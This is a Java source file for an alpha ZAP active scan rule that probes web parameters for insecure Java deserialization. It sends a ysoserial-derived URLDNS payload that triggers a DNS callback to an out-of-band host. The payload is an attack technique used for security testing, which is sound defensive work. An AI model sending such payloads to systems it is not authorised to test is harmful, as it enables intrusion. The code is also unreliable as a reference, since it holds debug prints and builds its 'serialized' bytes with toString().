/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2014 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

// import java.util.Map;
import java.util.HashMap;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.io.IOException;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
// import java.util.Collections;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
// import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
// import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerabilities;
import org.zaproxy.addon.commonlib.vulnerabilities.Vulnerability;
import org.zaproxy.addon.oast.ExtensionOast;

public class InsecureDeserializationScanRule extends AbstractAppParamPlugin implements CommonActiveScanRuleInfo {

    private static final int PLUGIN_ID = 90041;

    private static final Vulnerability VULN = Vulnerabilities.getDefault().get("cwe_502");

    private static final Logger LOGGER = LogManager.getLogger(InsecureDeserializationScanRule.class);

    @Override
    public int getId() {
        return PLUGIN_ID;
    }

    @Override
    public String getName() {
        return "ascanrulesAlpha.insecuredeserializationname";
    }

    @Override
    public String getDescription() {
        return VULN.getDescription();
    }

    @Override
    public String getSolution() {
        return VULN.getSolution();
    }

    @Override
    public String getReference() {
        return VULN.getReferencesAsString();
    }

    @Override
    public int getCategory() {
        return Category.SERVER;
    }

    // THIS SHOULD INCLUDE ANY LATER TECHNOLOGIES (i.e. .NET, Python, etc)
    // @Override
    // public boolean targets(TechSet technologies) {
    //     return technologies.includes(Tech.JAVA);
    // }

    @Override
    public void scan(HttpMessage msg, String param, String value) {
        LOGGER.info("Starting!");
        System.out.println("Hello?");
        try {
            ExtensionOast extOast = Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
            if (extOast != null && extOast.getCallbackService() != null) {
                HttpMessage newMsg = getNewMsg();
                Alert alert =
                        newAlert()
                                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                                .setMessage(newMsg)
                                .setSource(Alert.Source.ACTIVE)
                                .build();
                String callbackPayload = extOast.registerAlertAndGetPayloadForCallbackService(alert, InsecureDeserializationScanRule.class.getSimpleName());
                byte[] payload = generateSerializedPayload(callbackPayload);
                newMsg.setRequestBody(payload);
                sendAndReceive(newMsg);
            }
        } catch (Exception e) {
            LOGGER.warn("Could not perform Insecure Deserialization Attack.", e);
            return;
        }
    }


    /**
     * Generates a serialized payload for the given OAST URL.
     * @param oastUrl The OAST URL to be serialized.
     * @return The serialized payload as a byte array.
     * @throws Exception
     */
    private byte[] generateSerializedPayload(String oastUrl) throws Exception {
        System.out.println("Generating payload for OAST payload: " + oastUrl);
        Object payload = generateJavaObject(oastUrl);
        return payload.toString().getBytes();
    }

    /**
     *  Implemented from ysoserial's URLDNS payload
     * This serializes a URL to exploit Java-based serialization.
     * 
     * Original blog post:
     * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
     * 
     * ysoserial payload author: GEBL
     * ysoserial repo: https://github.com/frohoff/ysoserial
     * 
     * @param url The URL to be serialized.
     * @return The serialized URL object.
     * @throws Exception
     */
    private Object generateJavaObject(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap<URL, String> ht = new HashMap<URL, String>();
        URL u = new URL(null, url, handler);
        ht.put(u, url);

        Field field = u.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u, -1);

        return ht;
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        
        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        } 

        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}